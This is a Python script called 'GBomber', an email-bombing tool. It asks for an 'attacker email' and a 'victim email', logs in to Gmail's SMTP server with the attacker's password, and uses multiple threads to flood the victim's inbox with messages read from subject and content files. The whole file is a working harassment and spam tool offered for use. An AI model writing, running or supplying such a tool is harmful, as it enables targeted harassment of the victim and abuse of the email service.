#!/usr/bin/python3

import signal
import smtplib
import getpass
from sys import stdout
from pwn import *

#Colors
def red():
	RED = "\033[1;31m\033[1m"
	stdout.write(RED)

def blue():
	BLUE = "\033[0;36m\033[1m"
	stdout.write(BLUE)

def purple():
	PURPLE = "\033[0;35m\033[1m"
	stdout.write(PURPLE)

def gray():
	GRAY = "\033[0;37m\033[1m"
	stdout.write(GRAY)

def end():
	END = "\033[0m"
	stdout.write(END)

def banner():
	blue()
	print("""\n	   ___     ___                    _
	  / __|   | _ )    ___    _ __   | |__     ___      _ _  \t\t\t\tBY Invertebrado
	 | (_ |   | _ \   / _ \  | '  \  | '_ \   / -_)    | '_|
	  \___|   |___/   \___/  |_|_|_| |_.__/   \___|   _|_|_\tPERSONAL PAGE https://invertebr4do.github.io
	_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|  \tGITHUB https://github.com/Invertebr4do
	"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'""")
	end()

banner()

def def_handler(sig, frame):
	red()
	print("\n[!] Exiting...")
	end()
	if threading.activeCount() > 1:
		os.system("tput cnorm")
		os._exit(getattr(os, "_exitcode", 0))
	else:
		os.system("tput cnorm")
		sys.exit(getattr(os, "_exitcode", 0))

signal.signal(signal.SIGINT, def_handler)

subject = open("subject_content.txt", "r")
content = open("message_content.txt", "r")

gray()
from_address = input(str("\n[*] Enter your attacker email: "))
gray()
to_address = input(str("[*] Enter the victim email: "))
gray()
m_t = input("\n[*] How many threads do you want to use? [less is better]: ")
gray()
password = getpass.getpass('\n[*] Enter the password for [%s]: ' % from_address.rstrip("\n"))
end()

if len(password.rstrip()) < 1:
	red()
	print("\n[-] Invalid password")
	end()
	sys.exit(1)

if '@' not in from_address or '@' not in to_address:
        red()
        print("\n[-] Invalid email address")
        end()
        sys.exit(1)

if 'gmail' not in from_address or 'gmail' not in to_address:
	red()
	print("\n[-] Only for gmail accounts")
	end()
	sys.exit(1)

if int(m_t) < 1:
	m_t = 1

purple()
print("\n" + "-"*80 + "\n")
end()

p1 = log.progress("Emails sent")
p2 = log.progress("Email content")

def sendSpam():
	emails = 1
	for c in content:
		p2.status("%s" % c)
		for s in subject:
			message = """\
			%s
			%s
			""" % (s, c)

			server = smtplib.SMTP('smtp.gmail.com', 587)
			server.starttls()
			server.login(from_address, password)
			server.sendmail(from_address, to_address, message.encode('utf-8'))
			server.quit()

			p1.status("%d" % emails)
			emails += 1
			break

	p1.success("%d" % emails)
	sys.exit(0)

if __name__ == '__main__':

	threads = []

	try:
		for i in range(0, int(m_t)):
			t = threading.Thread(target=sendSpam)
			threads.append(t)
			sys.stderr = open("/dev/null", "w")

		for x in threads:
			x.start()

		for x in threads:
			x.join()

	except Exception as e:
		log.failure(str(e))
		sys.exit(1)
